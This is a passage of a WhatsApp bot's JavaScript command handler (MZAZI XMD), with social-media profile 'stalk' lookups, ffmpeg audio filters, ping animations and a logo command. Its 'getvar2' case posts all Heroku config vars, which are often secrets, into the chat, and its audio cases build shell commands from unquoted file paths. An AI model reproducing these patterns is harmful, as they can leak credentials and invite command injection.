📌 *TikTok Profile Info* 📌

👤 *Username:* ${profile.username}
📛 *Nickname:* ${profile.nickname}
📝 *Bio:* ${profile.bio || 'No bio'}
✅ *Verified:* ${profile.verified ? 'Yes' : 'No'}
🔒 *Private Account:* ${profile.private ? 'Yes' : 'No'}
🌍 *Region:* ${profile.region}
📅 *Created At:* ${new Date(profile.createdAt).toLocaleDateString()}

📊 *Stats:*
👥 *Followers:* ${stats.followers.toLocaleString()}
🫂 *Following:* ${stats.following.toLocaleString()}
❤️ *Likes:* ${stats.likes.toLocaleString()}
🎥 *Videos:* ${stats.videos.toLocaleString()}
🤝 *Friends:* ${stats.friends.toLocaleString()}

⚙️ *Settings:*
💬 *Comments:* ${settings.comment === 0 ? 'Everyone' : 'Friends/Off'}
🎭 *Duets:* ${settings.duet === 0 ? 'Everyone' : 'Friends/Off'}
🧵 *Stitch:* ${settings.stitch === 0 ? 'Everyone' : 'Friends/Off'}
⬇️ *Download:* ${settings.download === 0 ? 'Allowed' : 'Disabled'}
`.trim();

    await client.sendMessage(
      m.chat,
      {
        image: { url: profile.avatars.large },
        caption: summary
      },
      { quoted: m }
    );

  } catch (error) {
    console.error('TikTok stalk error:', error);
    m.reply("An error occurred while fetching TikTok profile.");
  }
  break;
}
//===============================================================================================//
case 'twstalk': {
  try {
    if (!text) return m.reply('Please provide a Twitter username to stalk');

    const fetch = require("node-fetch");
    const username = text.trim().replace('@', '');

    const response = await fetch(`https://apis-keith.vercel.app/stalker/twitter?user=${username}`);
    const data = await response.json();

    if (!data.status) {
      return m.reply("Failed to fetch Twitter profile. Maybe the user doesn't exist?");
    }

    const profile = data.result.profile;
    const stats = data.result.stats;

    const summary = `
🐦 *Twitter Profile Info* 🐦

👤 *Username:* @${profile.username}
📛 *Display Name:* ${profile.displayName}
📝 *Bio:* ${profile.description || 'No bio'}
📍 *Location:* ${profile.location || 'Not specified'}
✅ *Verified:* ${profile.verified ? 'Yes' : 'No'}
📅 *Joined:* ${new Date(profile.createdAt).toLocaleDateString()}

📊 *Stats:*
💬 *Tweets:* ${stats.tweets.toLocaleString()}
👥 *Following:* ${stats.following.toLocaleString()}
🫂 *Followers:* ${stats.followers.toLocaleString()}
❤️ *Likes:* ${stats.likes.toLocaleString()}
🖼️ *Media:* ${stats.media.toLocaleString()}
`.trim();

    await client.sendMessage(
      m.chat,
      {
        image: { url: profile.images.avatar.replace('_normal', '') },
        caption: summary
      },
      { quoted: m }
    );

  } catch (error) {
    console.error('Twitter stalk error:', error);
    m.reply("An error occurred while fetching Twitter profile.");
  }
  break;
}
//==========================================================================//
case 'whstalk': {
  try {
    if (!text) return m.reply('Provide a WhatsApp channel link to stalk');

    const fetch = require("node-fetch");

    if (!text.includes('whatsapp.com/channel')) {
      return m.reply(`Doesn't look like a WhatsApp channel link, uh?`);
    }

    const response = await fetch(`https://itzpire.com/stalk/whatsapp-channel?url=${text}`);
    const data = await response.json();

    const img = data.data.img;
    const name = data.data.title;
    const followers = data.data.followers;
    const description = data.data.description;

    await client.sendMessage(
      m.chat,
      {
        image: { url: img },
        caption: `📢 *Channel Name:* ${name}\n👥 *Followers:* ${followers}\n📝 *Description:* ${description || 'No description'}`
      },
      { quoted: m }
    );

  } catch (error) {
    m.reply("Error occurred\n" + error);
  }
  break;
}
//==============================================================================//
case 'ytstalk': {
  try {
    if (!text) return m.reply('Please provide a YouTube channel username to stalk');

    const fetch = require("node-fetch");
    const username = text.trim().replace('@', '');

    const response = await fetch(`https://apis-keith.vercel.app/stalker/ytchannel?user=${username}`);
    const data = await response.json();

    if (!data.status) {
      return m.reply("Failed to fetch YouTube channel. Maybe the channel doesn't exist?");
    }

    const channel = data.result.channel;
    const videos = data.result.videos;

    let summary = `
📺 *YouTube Channel Info* 📺

🔍 *Username:* ${channel.username}
🌐 *URL:* ${channel.url}
📝 *Description:* ${channel.description || 'No description'}

📊 *Stats:*
👥 *Subscribers:* ${channel.stats.subscribers.toLocaleString()}
🎥 *Videos:* ${channel.stats.videos.toLocaleString()}

🎬 *Latest Videos:*
`;

    videos.slice(0, 3).forEach(video => {
      summary += `\n▶️ *${video.title}*
⏱️ ${video.duration} | 👀 ${video.views.toLocaleString()} views
⏰ ${video.published} | ${video.isShort ? 'SHORT' : 'VIDEO'}
🔗 ${video.url}\n`;
    });

    await client.sendMessage(
      m.chat,
      {
        image: { url: channel.avatar.replace('=s72-c-k-c0x00ffffff-no-rj', '=s800-c-k-c0x00ffffff-no-rj') },
        caption: summary
      },
      { quoted: m }
    );

    if (videos.length > 0) {
      const thumbs = videos.slice(0, 2).map(video => ({
        image: { url: video.thumbnail },
        caption: `▶️ ${video.title}\n👀 ${video.views.toLocaleString()} views | ⏱️ ${video.duration}`
      }));

      for (const thumb of thumbs) {
        await client.sendMessage(m.chat, thumb, { quoted: m });
      }
    }

  } catch (error) {
    console.error('YouTube stalk error:', error);
    m.reply("An error occurred while fetching YouTube channel.");
  }
  break;
}
//====================================================================================//
case 'bass': {
  const fs = require('fs');
  const { exec } = require('child_process');

  try {
    const quoted = m.quoted ? m.quoted : null;
    const mime = quoted?.mimetype || "";

    if (!quoted || !/audio/.test(mime)) {
      return await client.sendMessage(m.chat, { text: `Reply to an *audio file* with *prefix + bass* to modify it.` }, { quoted: m });
    }

    const mediaPath = await client.downloadAndSaveMediaMessage(quoted);
    const outputPath = getRandom('.mp3');

    exec(`ffmpeg -i ${mediaPath} -af equalizer=f=54:width_type=o:width=2:g=20 ${outputPath}`, (error) => {
      fs.unlinkSync(mediaPath);
      if (error) {
        return client.sendMessage(m.chat, { text: error.toString() }, { quoted: m });
      }

      const audioBuffer = fs.readFileSync(outputPath);
      client.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg' }, { quoted: m });
      fs.unlinkSync(outputPath);
    });

  } catch (err) {
    client.sendMessage(m.chat, { text: err.toString() }, { quoted: m });
  }
  break;
}
//================================================================================//
case 'slow': {
  const fs = require('fs');
  const { exec } = require('child_process');

  try {
    const quoted = m.quoted ? m.quoted : null;
    const mime = quoted?.mimetype || "";

    if (!quoted || !/audio/.test(mime)) {
      return await client.sendMessage(m.chat, { text: `Reply to an *audio file* with *prefix + slow* to speed it up.` }, { quoted: m });
    }

    const mediaPath = await client.downloadAndSaveMediaMessage(quoted);
    const outputPath = getRandom('.mp3');

    exec(`ffmpeg -i ${mediaPath} -af atempo=4/4,asetrate=44500*2/3 ${outputPath}`, (error) => {
      fs.unlinkSync(mediaPath);
      if (error) {
        return client.sendMessage(m.chat, { text: error.toString() }, { quoted: m });
      }

      const audioBuffer = fs.readFileSync(outputPath);
      client.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg' }, { quoted: m });
      fs.unlinkSync(outputPath);
    });

  } catch (err) {
    client.sendMessage(m.chat, { text: err.toString() }, { quoted: m });
  }
  break;
}
//============================================================================//
case 'volume': {
  const fs = require('fs');
  const { exec } = require('child_process');

  try {
    const quoted = m.quoted ? m.quoted : null;
    const mime = quoted?.mimetype || "";

    if (!quoted || !/audio/.test(mime)) {
      return await client.sendMessage(m.chat, { text: `Reply to an *audio file* with *prefix + volume* to boost volume.` }, { quoted: m });
    }

    const mediaPath = await client.downloadAndSaveMediaMessage(quoted);
    const outputPath = getRandom('.mp3');

    exec(`ffmpeg -i ${mediaPath} -af volume=12 ${outputPath}`, (error) => {
      fs.unlinkSync(mediaPath);
      if (error) {
        return client.sendMessage(m.chat, { text: error.toString() }, { quoted: m });
      }

      const audioBuffer = fs.readFileSync(outputPath);
      client.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg' }, { quoted: m });
      fs.unlinkSync(outputPath);
    });

  } catch (err) {
    client.sendMessage(m.chat, { text: err.toString() }, { quoted: m });
  }
  break;
}
//=========================================================================/-
case 'crush': {
  const { getRandom } = require(__dirname + "/Mzazi/botFunctions.js");
  const fs = require('fs');
  const { exec } = require('child_process');

  try {
    const quoted = m.quoted ? m.quoted : null;
    const mime = quoted?.mimetype || "";

    if (!quoted || !/audio/.test(mime)) {
      return await client.sendMessage(m.chat, { text: `Reply to an *audio file* with *prefix + crush* to apply bitcrusher effect.` }, { quoted: m });
    }

    const mediaPath = await client.downloadAndSaveMediaMessage(quoted);
    const outputPath = getRandom('.mp3');

    exec(`ffmpeg -i ${mediaPath} -af acrusher=.1:1:64:0:log ${outputPath}`, (error) => {
      fs.unlinkSync(mediaPath);
      if (error) {
        return client.sendMessage(m.chat, { text: error.toString() }, { quoted: m });
      }

      const audioBuffer = fs.readFileSync(outputPath);
      client.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg' }, { quoted: m });
      fs.unlinkSync(outputPath);
    });

  } catch (err) {
    client.sendMessage(m.chat, { text: err.toString() }, { quoted: m });
  }
  break;
} 
//==============================================================================//
case 'speed2': case 'ping2':
{
    const speed = require("performance-now");

    function delay(ms) {
      return new Promise(resolve => setTimeout(resolve, ms));
    }

    async function loading(m, client) {
      const symbols = ["💜", "⚔️", "💖", "🖤", "💙", "💚"];
      let { key } = await client.sendMessage(m.chat, { text: '*🇰🇪 Enjoy...with MZAZI XMD.....*' });

      for (let i = 0; i < symbols.length; i++) {
        await client.sendMessage(m.chat, { text: symbols[i], edit: key });
        await delay(500);
      }

      await client.sendMessage(m.chat, { delete: key });
    }

    try {
        const timestamp = speed();
        const pingSpeed = speed() - timestamp;

        let quotedMsg = {
          key: { fromMe: false, participant: `0@s.whatsapp.net`, remoteJid: 'status@broadcast' },
          message: {
            contactMessage: {
              displayName: author,
              vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;a,;;;\nFN:${author}\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
            }
          }
        };

        await client.sendMessage(m.chat, {
          text: `${botname} speed\n\n *${pingSpeed.toFixed(4)} m/s..*`
        }, { quoted: quotedMsg });

        await loading(m, client);

    } catch (error) {
        console.error("Speed case error:", error);
        await m.reply('An error occurred while testing speed.');
    }

    break;
}
//==============================================================================//		      
case 'speed3': case 'ping3':
{
    const speed = require("performance-now");

    function delay(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    async function loadingAnimation({ client, m }) {
        try {
            const symbols = ["◼️", "◻️", "▪️", "▫️", "⬛", "⬜"];
            const { key } = await client.sendMessage(m.chat, { text: '⏳ Calculating performance metrics...' });

            for (const symbol of symbols) {
                await client.sendMessage(m.chat, { text: symbol, edit: key });
                await delay(250);
            }

            await client.sendMessage(m.chat, { delete: key });
        } catch (error) {
            console.error('Loading Animation Error:', error);
        }
    }

    try {
        const timestamp = speed();
        const pingSpeed = speed() - timestamp;

        const perfMessage = `⚡ ${botname} Response Speed\n\n📶 *Latency:* ${pingSpeed.toFixed(4)}ms\n\n_Server performance metrics_`;

        await client.sendMessage(m.chat, {
            text: perfMessage,
            contextInfo: {
                mentionedJid: [m.sender],
                forwardingScore: 999,
                isForwarded: true
            }
        });

        await loadingAnimation({ client, m });

    } catch (error) {
        console.error('SpeedV2 Error:', error);
        await client.sendMessage(m.chat, { text: `❌ Failed to measure performance: ${error.message}` });
    }

    break;
}
//=====================================================================================//
case 'getvar2':
{
    const Heroku = require('heroku-client');

    try {
        if (!herokuapikey || !herokuAppname) {
            return m.reply('Missing Heroku credentials. Please set both API key and App name.');
        }

        const heroku = new Heroku({ token: herokuapikey });
        const baseURI = `/apps/${herokuAppname}/config-vars`;

        const configVars = await heroku.get(baseURI);

        let str = '*╭───༺ All Heroku Config Vars ༻───╮*\n\n';
        for (let key in configVars) {
            if (configVars.hasOwnProperty(key)) {
                str += `★ *${key}* = ${configVars[key]}\n`;
            }
        }

        str += '\n*╰──────────────────────────────╯*';

        m.reply(str);

    } catch (error) {
        console.error('Error fetching Heroku vars:', error);
        m.reply('❌ Failed to fetch Heroku config vars. Check your API key and app name.');
    }

    break;
}
//========================================================================================//
case 'ephoto':
    {
        if (!text || !text.includes('|')) {
            return m.reply("Usage: .logo url|name\nExample: .logo https://mzazi.net|Mzazi");
        }

        const [url, name] = text.split('|').map(x => x.trim());

        try {
            const res = await fetch(`https://api-pink-venom.vercel.app/api/logo?url=${url}&name=${name}`);
            const data = await res.json();

            if (!data?.result?.download_url) {
                return m.reply("❌ Failed to fetch logo.");
            }

            await client.sendMessage(m.chat, {
                image: { url: data.result.download_url },
                caption: `Here's your logo for *${name}*\n\n@𝗣𝗢𝗪𝗘𝗥𝗘𝗗 𝗕𝗬 𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗`
            }, { quoted: m });
        } catch (err) {
            console.error(err);
            m.reply("⚠️ Error fetching logo.");
        }
    }
    break;
//==================================================================//



		      
  default: {
          if (cmd && budy.toLowerCase() != undefined) {
            if (m.chat.endsWith("broadcast")) return;
            if (m.isBaileys) return;
            if (!budy.toLowerCase()) return;
            if (argsLog || (cmd && !m.isGroup)) {
              // client.sendReadReceipt(m.chat, m.sender, [m.key.id])
              console.log(chalk.black(chalk.bgRed("[ ERROR ]")), color("command", "turquoise"), color(`${prefix}${command}`, "turquoise"), color("Mzazi", "turquoise"));
            } else if (argsLog || (cmd && m.isGroup)) {
              // client.sendReadReceipt(m.chat, m.sender, [m.key.id])
              console.log(chalk.black(chalk.bgRed("[ ERROR ]")), color("command", "turquoise"), color(`${prefix}${command}`, "turquoise"), color("Mzazi", "turquoise"));
            }
          }
        }
      }
    }
  } catch (err) {
    m.reply(util.format(err));
  }
};


let file = require.resolve(__filename);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  console.log(chalk.redBright(`Update ${__filename}`));
  delete require.cache[file];
  require(file);
});



 
  
